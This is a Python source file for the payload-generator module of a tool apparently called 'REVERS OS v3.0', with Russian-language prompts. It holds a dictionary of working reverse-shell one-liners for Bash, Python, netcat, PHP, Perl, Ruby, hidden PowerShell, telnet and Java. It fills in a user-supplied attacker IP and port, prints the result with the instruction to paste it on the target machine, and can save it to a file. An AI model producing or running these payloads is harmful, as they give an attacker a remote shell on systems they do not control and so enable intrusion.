#!/usr/bin/env python3
"""
REVERS OS v3.0 — Payload Generator
Генератор реверс-шеллов и пейлоадов
"""

from core.utils import C_ERROR, C_SUCCESS, C_WARNING, C_INFO, C_DIM, C_BRIGHT, C_RESET

PAYLOADS = {
    "Bash": {
        "bash -i": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "bash 196": '0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
        "bash 5": 'exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done',
    },
    "Python": {
        "python": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'',
        "python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'',
        "python3 short": 'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'',
    },
    "Netcat": {
        "nc mkfifo": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        "nc -e": 'nc -e /bin/sh {ip} {port}',
        "nc -c": 'nc -c sh {ip} {port}',
    },
    "PHP": {
        "php exec": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "php system": 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");\'',
        "php proc_open": 'php -r \'$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'',
    },
    "Perl": {
        "perl": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    },
    "Ruby": {
        "ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    },
    "Powershell": {
        "ps1": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
    },
    "Telnet": {
        "telnet": 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF',
    },
    "Java": {
        "java": 'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()',
    },
}

def run_payload_gen(args):
    print(f"\n{C_WARNING}  ══════════════════════════════════════════{C_RESET}")
    print(f"{C_WARNING}         🧬 PAYLOAD GENERATOR{C_RESET}")
    print(f"{C_WARNING}  ══════════════════════════════════════════{C_RESET}\n")
    
    # Запрос IP и порта
    ip = input(f"{C_INFO}LHOST (твой IP): {C_RESET}").strip()
    if not ip:
        print(f"{C_ERROR}[!] IP не указан.{C_RESET}")
        return
    
    try:
        port = int(input(f"{C_INFO}LPORT (порт): {C_RESET}").strip())
    except ValueError:
        print(f"{C_ERROR}[!] Некорректный порт.{C_RESET}")
        return
    
    print(f"\n{C_INFO}Доступные пейлоады:{C_RESET}\n")
    
    # Вывод списка
    categories = list(PAYLOADS.keys())
    for i, cat in enumerate(categories, 1):
        print(f"  {C_BRIGHT}{i}. {cat}{C_RESET}")
        for j, (name, _) in enumerate(PAYLOADS[cat].items(), 1):
            print(f"     {C_DIM}{i}.{j}{C_RESET} {name}")
        print()
    
    print(f"  {C_DIM}0. Выход{C_RESET}")
    
    try:
        choice = input(f"\n{C_INFO}Выберите пейлоад (например 1.1): {C_RESET}").strip()
        
        if choice == "0":
            return
        
        parts = choice.split(".")
        if len(parts) == 2:
            cat_idx = int(parts[0]) - 1
            pay_idx = int(parts[1]) - 1
            
            if 0 <= cat_idx < len(categories):
                cat = categories[cat_idx]
                names = list(PAYLOADS[cat].keys())
                if 0 <= pay_idx < len(names):
                    name = names[pay_idx]
                    payload = PAYLOADS[cat][name].format(ip=ip, port=port)
                    
                    print(f"\n{C_WARNING}══════════════════════════════════════════{C_RESET}")
                    print(f"{C_BRIGHT}{cat} > {name}{C_RESET}")
                    print(f"{C_WARNING}══════════════════════════════════════════{C_RESET}")
                    print(f"\n{C_SUCCESS}{payload}{C_RESET}")
                    print(f"\n{C_DIM}Скопируй и вставь на целевой машине.{C_RESET}")
                    
                    # Сохранение в файл
                    save = input(f"\n{C_INFO}Сохранить в файл? (y/n): {C_RESET}").strip().lower()
                    if save in ['y', 'yes', 'д', 'да']:
                        filename = f"payload_{cat.lower()}_{name.replace(' ', '_')}.txt"
                        with open(filename, "w") as f:
                            f.write(payload)
                        print(f"{C_SUCCESS}Сохранено: {filename}{C_RESET}")
                else:
                    print(f"{C_ERROR}[!] Неверный номер пейлоада.{C_RESET}")
        else:
            print(f"{C_ERROR}[!] Неверный формат. Используйте X.Y (например 1.1){C_RESET}")
    
    except (ValueError, IndexError):
        print(f"{C_ERROR}[!] Неверный выбор.{C_RESET}")
    
    print()
